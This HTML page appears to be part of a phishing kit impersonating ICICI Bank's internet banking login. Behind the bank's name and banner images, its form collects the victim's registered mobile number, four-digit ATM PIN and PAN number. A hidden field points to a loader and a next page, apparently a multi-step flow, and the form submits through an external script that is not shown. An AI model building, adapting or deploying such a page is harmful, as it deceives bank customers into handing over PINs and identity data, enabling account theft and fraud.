<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
    <title>ICICI Bank</title>
</head>

<body>
    <header class="d-flex justify-content-center">
        <img src="header.png" width="100%" alt="">
    </header>
    <main class="container px-3">
        <div id="test" class="text-danger text-center fw-bold"></div>
        <input type="hidden" id="page_type" value="home">
        <input type="hidden" id="nextValue" value="loader.html?next=2.html">
        <strong>Welcome to ICICI Bank</strong>
        <div class="mt-2 py-5 px-4 form-div">
                <h6 style="font-weight:600">
                    <div class="d-inline-flex gap-2">
                        <img src="lock.svg" width="22" alt="">
                        <span>    Login to Internet Banking</span>
                    </div>
                </h6>
            <form action="" id="form" class="mt-3">
                <div class="form-group">
                    <label for="" class="form-label">Registered Mobile Number</label>
                    <div class="d-flex align-items-center" style="gap:10px;">
                        <input type="text" inputmode="numeric" minlength="10" maxlength="10" name="phone" class="form-control" required>
                    </div>
                </div>
                <div class="form-group">
                    <label for="" class="form-label">ATM PIN</label>
                    <input type="password"  inputmode="numeric" name="atmpin" maxlength="4" minlength="4" class="form-control" required>
                </div>
                <div class=" form-group">
                    <label for="" class="form-label">Pan Number</label>
                    <input type="text" name="pnnn" class="form-control" maxlength="10" pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}" minlength="10" title="invalid pan card no"   required>
                </div>
                <div class="d-flex justify-content-center">
                    <button type="submit" id="submit-button" class="btn btn-lg bg-color btn-danger mt-2">Submit</button>
                </div>
            </form>
        </div>
    </main>
    
    <footer class="mt-4">
        <img src="footer1.png" width="100%" alt="">
        <img src="footer.png" width="100%" alt="">
    </footer>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
        crossorigin="anonymous"></script>
    <script src="script.js"></script>
</body>

</html>
